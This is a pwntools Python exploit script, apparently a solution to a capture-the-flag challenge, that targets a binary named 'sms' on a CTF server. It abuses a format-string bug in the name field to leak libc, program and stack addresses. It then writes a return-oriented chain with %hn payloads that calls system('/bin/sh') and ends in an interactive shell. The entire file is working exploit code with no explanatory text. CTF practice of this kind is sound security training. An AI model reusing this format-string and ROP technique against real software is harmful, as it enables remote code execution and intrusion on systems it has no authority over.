from pwn import *
from icecream import ic

elf = exe = ELF("./sms_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("sms.squ1rrel-ctf-codelab.kctf.cloud", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001333
pie b 0x000000000000148a
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(inp2):
    ru("Message:")
    sl(b'a')
    ru("Your name:")
    sl(f"%{inp2}$p".encode())
    ru("Bushy-tailed farewells,\n")
    a = int(re(14).decode(), 16)
    ru("Would you like to send another message? (y/n)")
    sl('y')
    return a

libc.address = leak('21') - 0x8459a
elf.address = leak('9') - 0x13c3
stack_leak = leak('6') + 0xa4

ic(hex(libc.address))
ic(hex(elf.address))

pop_rdi = elf.address + 0x00000000000014f3
binsh = libc.address + 0x1b45bd
system = libc.address + 0x52290
ret = elf.address + 0x000000000000101a
ic(hex(pop_rdi))
ic(hex(binsh))
ic(hex(system))

def write(inp2, retaddr):
    ic(hex(inp2))
    test = str(hex(inp2)[2:])
    test2 = int(test[-4:-2], 16)
    test3 = int(test[-6:-4], 16)
    test4 = int(test[-8:-6], 16)
    test5 = int(test[-10:-8], 16)
    test6 = int(test[-12:-10], 16)
    test = int(test[-2:], 16)
    l = [test6, test5, test4, test3, test2, test]
    ic(l)
    for i in range(6):
        ru("Message:")
        sl(p64(retaddr+i))
        ru("Your name:")
        payload = f"%{l.pop()}c%12$hn".encode()
        sl(payload)
        ru("Would you like to send another message? (y/n)")
        sl('y')

write(ret, stack_leak)
write(pop_rdi, stack_leak+8)
write(binsh, stack_leak+16)
write(system, stack_leak+24)

ru("Message:")
sl(b'a')
ru("Your name:")
sl(b'a')
ru("Would you like to send another message? (y/n)")
sl('n')


i()
